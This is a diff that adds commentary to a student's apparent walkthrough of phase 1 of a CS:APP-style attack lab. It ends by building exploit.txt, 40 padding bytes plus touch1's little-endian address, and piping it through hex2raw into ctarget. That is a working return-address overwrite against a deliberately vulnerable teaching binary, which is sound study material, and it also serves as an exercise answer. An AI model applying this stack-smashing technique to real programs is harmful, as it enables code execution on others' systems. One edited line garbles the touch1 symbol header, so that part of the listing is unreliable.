@@ -11,6 +11,9 @@ unix> objdump -d ctarget
     
     // this line below tells us that the address will need to be 0x28
     // bytes long, which translates to 40 bytes in decimal
+    // so since it can only take 40 bytes, we want to write 40 bytes of nothing
+    // and then smack our touch1 address onto the end of it to get the 
+    // code to execute
     1ef7:	48 83 ec 28          	sub    $0x28,%rsp
     
     1efb:	48 89 e7             	mov    %rsp,%rdi
@@ -19,7 +22,9 @@ unix> objdump -d ctarget
     1f08:	48 83 c4 28          	add    $0x28,%rsp
     1f0c:	c3                   	retq   
 
-0000000000001f0d <touch1>:
+// all touch1 is doing here is executing the attack, but in this phase we
+// just want it to run and don't really worry about the contents
+00 00 00 00 00 00 1f 0d <touch1>:
     1f0d:	f3 0f 1e fa          	endbr64 
     1f11:	50                   	push   %rax
     1f12:	58                   	pop    %rax
@@ -32,3 +37,19 @@ unix> objdump -d ctarget
     1f32:	e8 15 05 00 00       	callq  244c <validate>
     1f37:	bf 00 00 00 00       	mov    $0x0,%edi
     1f3c:	e8 bf f4 ff ff       	callq  1400 <exit@plt>
+
+// I have created a file called exploit.txt where I will store my answers
+// IMPORTANT: Remember to use little endian when you enter the address or else
+// it will not work as expected.
+unix> cat exploit.txt
+
+/* can only hold 40 bytes, so 40 bytes of 0s */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* address of touch1 */
+0d 1f 00 00 00 00 00 00
+
+// now it is time to pipe this into the target file
+// hex2raw helps us convert this into a proper string for grading purposes
+unix> cat exploit.txt | ./hex2raw | ./ctarget
+
+
